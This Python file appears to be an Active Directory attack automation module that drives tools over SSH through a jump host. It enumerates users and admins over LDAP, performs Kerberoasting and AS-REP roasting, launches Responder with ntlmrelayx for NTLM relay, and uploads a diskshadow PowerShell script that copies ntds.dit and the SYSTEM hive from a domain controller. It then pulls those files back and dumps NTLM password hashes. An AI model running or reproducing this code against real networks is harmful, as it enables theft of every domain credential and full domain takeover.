import subprocess
import sys
import time
import re

from helpers.ssh_connect import run_ssh_command, run_scp_command
from helpers.colors import Color, color_text, is_tool_installed


def _get_active_interfaces(jh):
    """Return a list of non-loopback, non-virtual network interface names on the jump host."""
    interface = run_ssh_command(jh, 'ip a')
    interfaces = []
    current_interface = None
    for line in interface[0].split('\n'):
        if_match = re.match(r'^\d+:\s+([^:]+):\s+<.*UP.*>', line)
        if if_match:
            current_interface = if_match.group(1)
            continue
        if current_interface and re.search(r'inet\s+\d+\.\d+\.\d+\.\d+', line):
            interfaces.append(current_interface)
            current_interface = None
    ifp = []
    for iface in interfaces:
        if iface != 'lo' and not iface.startswith(('docker', 'br-', 'veth', 'tun')):
            ifp.append(iface)
    return ifp


def en_users(jh, dc_ip, user, password, domain):
    """Dump enabled users, high-privilege users, and user descriptions from AD via LDAP over SSH."""
    ldapsearch = run_ssh_command(jh, 'command -v ldapsearch')
    if len(ldapsearch[0]) == 0:
        print('The following tool is missing: ldapsearch')
        sys.exit()

    if '@' not in user:
        user = f'{user}@{domain}'

    domain = domain.split('.')
    dns = ''
    for item in domain:
        if len(dns) == 0:
            dns += f'dc={item}'
        else:
            dns += f',dc={item}'

    create_rem_dir = 'mkdir users-dump'
    create = run_ssh_command(jh, create_rem_dir)

    # Auto-detect LDAP vs LDAPS by probing with a lightweight base query
    ldap_scheme = 'ldap'
    probe_cmd = f"ldapsearch -x -H ldap://{dc_ip} -D '{user}' -w '{password}' -b '{dns}' -s base '(objectClass=*)' 2>&1"
    probe_out, probe_err = run_ssh_command(jh, probe_cmd)
    if 'cannot contact' in probe_out.lower() or 'cannot contact' in probe_err.lower():
        ldap_scheme = 'ldaps'
        print(color_text('LDAP not available on port 389, trying LDAPS on port 636...', Color.YELLOW))

    command1 = f"ldapsearch -x -H {ldap_scheme}://{dc_ip} -D '{user}' -w '{password}' -E pr=1000/noprompt -b '{dns}' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > users-dump/enabled_users"

    command2 = f"ldapsearch -x -H {ldap_scheme}://{dc_ip} -D '{user}' -w '{password}' -E pr=1000/noprompt -b '{dns}' '(|(memberOf=CN=Domain Admins,{dns})(memberOf=CN=Enterprise Admins,CN=Users,{dns})(memberOf=CN=Schema Admins,CN=Users,{dns})(memberOf=CN=Administrators,CN=Builtin,{dns}))' sAMAccountName memberOf | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > users-dump/high_priv_users"

    awk_filter = """BEGIN {FS="\\n"; RS=""; OFS=","}{user=""; desc="";for (i=1; i<=NF; i++){if ($i ~ /^sAMAccountName:/) user=substr($i, 17);if ($i ~ /^description:/) desc=substr($i, 13);}print user, desc}"""
    command3 = f"ldapsearch -x -H {ldap_scheme}://{dc_ip} -D '{user}' -w '{password}' -E pr=1000/noprompt -b '{dns}' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName description | awk '{awk_filter}' > users-dump/users_descriptions"

    en = run_ssh_command(jh, command1)
    if len(en[1]) != 0:
        print(en[1])
        sys.exit()

    print(color_text('Enabled users dumped.\n', Color.GREEN))
    en_adm = run_ssh_command(jh, command2)
    print(color_text('High privilege users gathered!\n', Color.GREEN))
    us_desc = run_ssh_command(jh, command3)
    print(color_text('Users and their description gathered!', Color.GREEN))

    create_local_dir = ['mkdir', f'users-dump']
    create = subprocess.run(create_local_dir, capture_output=True, text=True)

    run_scp_command(jh, 'users-dump/enabled_users', f'users-dump/enabled_users', 'get')
    run_scp_command(jh, 'users-dump/high_priv_users', f'users-dump/high_priv_users', 'get')
    run_scp_command(jh, 'users-dump/users_descriptions', f'users-dump/users_descriptions', 'get')


def roasting(jh, dc_ip, user, password, domain):
    """Run Kerberoasting and ASREPRoasting against the target AD domain over SSH."""
    netexec = run_ssh_command(jh, 'command -v netexec')

    if len(netexec[0]) == 0:
        print('The following tool is missing: netexec')
        sys.exit()

    create_rem_dir = 'mkdir roasting'
    create = run_ssh_command(jh, create_rem_dir)

    kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --kerberoasting roasting/kerberoasted-users"
    asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --asreproast roasting/asreproasted-users"

    kerb = run_ssh_command(jh, kerb_cmd)

    if len(kerb[1]) != 0:
        print('Some error happened. : \n\n', kerb[1])
        sys.exit()
    print('Performing kerberoasting!')
    asrep = run_ssh_command(jh, asrep_cmd)
    print('Performing ASREPRoasting!')

    create_local_dir = ['mkdir', f'roasting']
    create = subprocess.run(create_local_dir, capture_output=True, text=True)

    run_scp_command(jh, 'roasting/kerberoasted-users', 'roasting/kerberoasted-users', 'get')
    run_scp_command(jh, 'roasting/asreproasted-users', 'roasting/asreproasted-users', 'get')


def responder_run(jh, config_file=None):
    """Start Responder (and optionally ntlmrelayx) on a jump host in a tmux session."""
    if config_file:
        tmux = run_ssh_command(jh, 'command -v tmux')
        responder = run_ssh_command(jh, 'command -v responder')
        netexec = run_ssh_command(jh, 'command -v netexec')
        impacket = run_ssh_command(jh, 'command -v impacket-ntlmrelayx')

        missing_stuff = []
        if len(impacket[0]) == 0:
            missing_stuff.append('impacket-ntlmrelayx')
        if len(tmux[0]) == 0:
            missing_stuff.append('tmux')
        if len(responder[0]) == 0:
            missing_stuff.append('responder')
        if len(netexec[0]) == 0:
            missing_stuff.append('netexec')

        if missing_stuff:
            for item in missing_stuff:
                print(f'The following tool is missing: {item}')
            sys.exit()

        print(color_text('\nGrabbing network interface to listen on...\n', Color.BOLD))
        ifp = _get_active_interfaces(jh)

        print(color_text('\nGrabbing target list from the config file...\n', Color.BOLD))
        targets = ''
        for host in config_file['hosts']:
            if host['name'] == jh:
                for scan in host['scans']:
                    targets += scan['target']+'\n'

        create_rem_dir = 'mkdir relayx'
        create = run_ssh_command(jh, create_rem_dir)

        print(color_text('\nUploading target list...\n', Color.BOLD))
        command = f'echo "{targets}" > relayx/scope-signing'
        run_ssh_command(jh, command)

        print(color_text('\nFinding smb signing disabled hosts...', Color.BOLD))
        command = 'netexec smb relayx/scope-signing --gen-relay-list relayx/no-smb-signing.txt'
        run_ssh_command(jh, command)

        print(color_text('\nMaking sure smb and http are off...', Color.BOLD))
        smb_off = "sudo sed -i '/^SMB[[:space:]]*=/ s/On/Off/; /^HTTP[[:space:]]*=/ s/On/Off/' /etc/responder/Responder.conf"
        stopping = run_ssh_command(jh, smb_off)

        print(color_text('\nStarting responder...', Color.BOLD))
        command = f"sudo responder -Pv -I {ifp[0]}"
        start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")

        print(color_text('\nStarting ntlmrelayx with smb2support and socks...', Color.BOLD))
        command = 'impacket-ntlmrelayx -tf relayx/no-smb-signing.txt -smb2support -socks'
        start_relay = run_ssh_command(jh, f"tmux new-session -d -s 'ntlmrelayx' '{command}'")

        print(color_text('\nEverything worked well probably! Responder and ntlmrelayx are running!', Color.BOLD))

    else:
        tmux = run_ssh_command(jh, 'command -v tmux')
        responder = run_ssh_command(jh, 'command -v responder')
        missing_stuff = []

        if len(tmux[0]) == 0:
            missing_stuff.append('tmux')
        if len(responder[0]) == 0:
            missing_stuff.append('responder')

        if missing_stuff:
            for item in missing_stuff:
                print(f'The following tool is missing: {item}')
            sys.exit()

        print(color_text('\nGrabbing network interface to listen on...', Color.BOLD))
        ifp = _get_active_interfaces(jh)

        print(color_text('\nMaking sure smb and http are on...', Color.BOLD))
        smb = "sudo sed -i '/^SMB[[:space:]]*=/ s/Off/On/; /^HTTP[[:space:]]*=/ s/Off/On/' /etc/responder/Responder.conf"
        smb_on = run_ssh_command(jh, smb)

        print(color_text('\nStarting responder...', Color.BOLD))
        command = f"sudo responder -Pv -I {ifp[0]}"
        start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")

        print(color_text('\nAll done! If everything worked well responder is running!', Color.GREEN))


def pas_audit(dc_ip, user, password, domain, jh=None, verbose=False):
    powershell_code = r'''
$DiskshadowScript = @"
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
set verbose on
add volume c: alias temp
create
expose %temp% z:
exec "C:\Windows\Temp\cop.cmd"
delete shadows volume %temp%
reset
"@ -replace "`n", "`r`n"

$ScriptPath = "C:\Windows\Temp\ds.txt"
$DiskshadowScript | Out-File -FilePath $ScriptPath -Encoding ASCII

$outputFile = "C:\Windows\Temp\diskshadow_output.txt"

echo 'copy z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit' | out-file C:\Windows\Temp\cop.cmd -encoding ascii
echo 'copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\copy-system.hive' | out-file C:\Windows\Temp\cop.cmd -encoding ascii -append

diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
'''
    netexec = run_ssh_command(jh, 'command -v nxc')
    if len(netexec[0]) == 0:
        print(color_text('\nThe following tool is missing: netexec\n', Color.RED))
        print(color_text("If nxc/netexec is actually installed/in path(this problem is usually cause by pipx netexec installs), then fix it by adding it in the global path with this:", Color.BOLD), "\n\necho 'export PATH=$PATH:~/.local/bin' >> ~/.zshenv  # For zsh \nor \necho 'export PATH=$PATH:~/.local/bin' >> ~/.profile # For bash")
        sys.exit()
    smbclient = run_ssh_command(jh, 'command -v smbclient')
    if len(smbclient[0]) == 0:
        print(color_text('The following tool is missing: smbclient\n', Color.RED))

    with open(f'audit.ps1', 'w') as f:
        f.write(powershell_code)

    if jh:
        if '@' in user:
            user = user.split('@')[0]

        script2 = run_scp_command(jh, 'audit.ps1', 'audit.ps1', 'put')

        print(color_text('Uploading audit.ps1 file to the target.\n', Color.BOLD))

        command12 = f"smbclient //{dc_ip}/C$ -U '{domain}/{user}' --password='{password}' -c 'put audit.ps1 Windows/Temp/audit.ps1'"

        cp_audit = run_ssh_command(jh, command12)
        if 'NT_STATUS_LOGON_FAILURE' in cp_audit[0]:
            print(cp_audit[0])
            sys.exit()

        time.sleep(1)

        command2 = f"nxc winrm {dc_ip} -u '{user}' -p '{password}' -X 'C:\\Windows\\Temp\\audit.ps1'"

        create_rem_dir = 'mkdir ntds'
        create = run_ssh_command(jh, create_rem_dir)

        print(color_text('Running diskshadow.\n', Color.BOLD))
        run_audit = run_ssh_command(jh, command2)
        if verbose:
            print(command2)
            print(run_audit[0])

        command322 = f"smbclient //{dc_ip}/C$ -U '{domain}/{user}' --password='{password}' -c 'get Windows/Temp/copy-system.hive ntds/copy-system.hive'"
        command333 = f"smbclient //{dc_ip}/C$ -U '{domain}/{user}' --password='{password}' -c 'get Windows/Temp/ntds.dit ntds/ntds.dit'"

        print(color_text('Diskshadow done, grabbing files over on the jumphost...\n', Color.GREEN))
        jh_grab_audit2 = run_ssh_command(jh, command322)
        jh_grab_audit3 = run_ssh_command(jh, command333)
        if verbose:
            print(command322, '\n', command333, '\n')
            print('\n', jh_grab_audit2[1], '\n', jh_grab_audit3[1], '\n')

        create_local_dir = ['mkdir', 'ntds']
        create = subprocess.run(create_local_dir, capture_output=True, text=True)

        print(color_text('Grabbing files over from jumphost...\n', Color.BOLD))

        grab_audit1 = run_scp_command(jh, 'ntds/ntds.dit', 'ntds/ntds.dit', 'get')
        grab_audit2 = run_scp_command(jh, 'ntds/copy-system.hive', 'ntds/copy-system.hive', 'get')

        print(color_text('Grabbing enabled users and high priv users. If fails only run users module.\n', Color.BOLD))
        users = en_users(jh, dc_ip, user, password, domain)

        print(color_text('\nApparently everything went well?\n', Color.GREEN))

        if is_tool_installed('impacket-secretsdump'):
            print(color_text('\nDumping the ntlm hashes using impacket-secretsdump locally...\n', Color.BOLD))
            create_local_dir = ['mkdir', 'ntlms']
            create = subprocess.run(create_local_dir, capture_output=True, text=True)
            command = ['impacket-secretsdump', '-system', 'ntds/copy-system.hive', '-ntds', 'ntds/ntds.dit', '-just-dc-ntlm', '-history', 'LOCAL', '-outputfile', 'ntlms/ntlm-dumps']
            running = subprocess.run(command, capture_output=True, text=True)
            print(color_text('\nNtlm hashes dumped! That was easy, right?', Color.GREEN))

        if is_tool_installed('secretsdump.py'):
            print(color_text('\nDumping the ntlm hashes using secretsdump.py locally...\n', Color.BOLD))
            create_local_dir = ['mkdir', 'ntlms']
            create = subprocess.run(create_local_dir, capture_output=True, text=True)
            command = ['secretsdump.py', '-system', 'ntds/copy-system.hive', '-ntds', 'ntds/ntds.dit', '-just-dc-ntlm', '-history', 'LOCAL', '-outputfile', 'ntlms/ntlm-dumps']
            running = subprocess.run(command, capture_output=True, text=True)
            print(color_text('\nNtlm hashes dumped! That was easy, right?', Color.GREEN))

        enabled_users_list = None
        with open(f'users-dump/enabled_users', 'r') as f:
            enabled_users_list = set(line.strip().lower() for line in f if line.strip())

        with open('ntlms/ntlm-dumps.ntds', 'r', encoding='utf-8', errors='ignore') as f, open('ntlms/enabled-only-ntlm.ntds', 'w') as out:
            for line in f:
                line = line.strip()

                if not line:
                    continue

                username = line.split(':', 1)[0].lower()

                if '\\' in username:
                    username = username.split('\\')[1]
                if '_history' in username:
                    username = username.split('_history')[0]

                if username in enabled_users_list:
                    out.write(line + '\n')

    else:
        print('jumphost not provided, this side of the module is not ready yet so please provide a jumphost :). ')
